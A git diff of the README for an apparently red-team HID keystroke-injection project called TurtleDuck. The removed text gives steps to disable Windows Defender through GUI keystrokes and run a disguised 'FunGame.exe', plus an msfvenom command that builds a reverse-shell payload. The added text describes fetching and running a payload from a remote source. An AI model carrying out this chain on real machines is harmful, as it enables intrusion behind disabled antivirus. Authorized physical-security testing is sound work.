@@ -1,65 +1,75 @@
-# TurtleDuck: Windows Defender Disable + USB Executable Launch (Authorized Use Only)
+# TurtleDuck: HID‑Based Payload Staging via PowerShell (Authorized Use Only)
 
-> ⚠️ For ethical red teaming, physical security testing, and educational use **only**.
+> ⚠️ For ethical red teaming, physical security testing, and educational use **only**.  
+> Explicit written authorization is required before use.
 
-This repository demonstrates how to use a HID injection device (such as a **USB Rubber Ducky**) to:
+This repository demonstrates how a **HID injection device** (e.g., USB Rubber Ducky–style keystroke injection) can automate user‑interface interactions on Windows to **stage and execute a payload via PowerShell**, without relying on a secondary USB storage device.
 
-* Simulate GUI automation of **disabling Windows Defender real-time protection**
-* Prompt the user to plug in a USB drive
-* Execute an `.exe` payload (e.g. `FunGame.exe`) from the USB device
-
-⚠️ **Do not run this code on any system you do not have explicit permission to test.**
+The emphasis is on **physical attack surface awareness**, **endpoint defense validation**, and **operator decision‑making under constraints** (user presence, privilege level), not on exploitation for exploitation’s sake.
 
 ---
 
 ## 💼 Intended Use Cases
 
-* Red team physical security testing (with written authorization)
-* Social engineering simulation exercises
-* Demonstrating physical attack surface to stakeholders
-* Purple team testing of endpoint defenses
+- Authorized red team physical security testing
+- Purple team endpoint defense validation
+- Demonstrating HID trust risks to stakeholders
+- User‑presence vs. execution feasibility analysis
+- Detection and response tabletop exercises
 
 ---
 
-## 📋 What It Does (Step-by-Step)
+## 📋 What It Does (High‑Level)
 
-1. Opens the Windows Defender Security Center via `windowsdefender:` URI
-2. Navigates the UI using `TAB`, `ENTER`, and `SPACE` keystrokes to disable **real-time protection**
-3. Launches an elevated PowerShell session using `Start-Process -Verb runAs`
-4. Displays a message box instructing the user to plug in the USB within 15 seconds
-5. Launches another elevated PowerShell session
-6. Executes `FunGame.exe` directly from the USB (drive `D:\` assumed, adjust as needed)
+1. Invokes Windows Security (Defender) via a system URI.
+2. Demonstrates GUI automation concepts and their fragility (requires appropriate privileges).
+3. Launches a PowerShell session.
+4. Stages a payload by retrieving it from a **remote HTTPS source**.
+5. Writes the payload to the **current user’s temporary directory**.
+6. Executes the staged payload from disk.
 
----
-
-## 🖱 Payload Trigger
-
-Use a HID device like [Hak5 Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) or [MalDuino](https://malduino.com/) to inject the keystrokes in `payload.txt`.
+> **Note:** Behavior and outcomes depend on user privilege, Defender configuration, and user presence. This project intentionally highlights those constraints.
 
 ---
 
-## 📁 Files
-* `payload.txt` – Final Ducky Script HID payload 
-* `README.md` – Documentation
+## 🖱 Trigger Mechanism
+
+A HID device injects keystrokes defined in `payload.txt`.  
+This project does **not** require a secondary USB drive for payload execution.
 
 ---
 
-## 🚀 Setup Instructions
+## 📁 Repository Contents
 
-1. Flash the HID device with the provided payload using the official encoder.
-2. Prepare a USB drive labeled `MYUSB` with a file named `FunGame.exe` with a msfvenom payload using --msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 -f exe > FunGame.exe--
-3. Insert the HID device into the target machine.
-4. After Defender is disabled and the message appears, plug in the USB.
-5. `FunGame.exe` will be executed from the USB.
+- `payload.txt` — HID keystroke payload
+- `README.md` — Documentation
 
 ---
 
-## ⚙️ Customization
+## ⚙️ Operational Notes
 
-To change the USB drive letter:
+- The payload is **disk‑backed** (written to the user’s temp directory).
+- Endpoint protection may block staging or execution depending on policy.
+- GUI‑driven approaches are **inherently fragile** and sensitive to OS/UI changes.
+- When a user is present and attentive, visible UI interactions are a limiting factor.
 
-* Modify this line in `payload.txt`:
+---
 
-  ```ducky
-  STRING Start-Process "D:\FunGame.exe"
-  ```
+## 🧭 Scope & Ethics
+
+- Do **not** use on systems you do not own or lack explicit authorization to test.
+- This repository is intended for **learning, validation, and reporting**, including documenting **prevented** actions as successful defensive outcomes.
+
+---
+
+## 🔧 Customization (Conceptual)
+
+- Remote source location, payload name, and timing are configurable within the HID script.
+- Any changes should remain within authorized scope and be documented for reporting.
+
+---
+
+## 📌 Disclaimer
+
+This project is provided for **defensive security education and authorized testing only**.  
+The author(s) assume no responsibility for misuse.
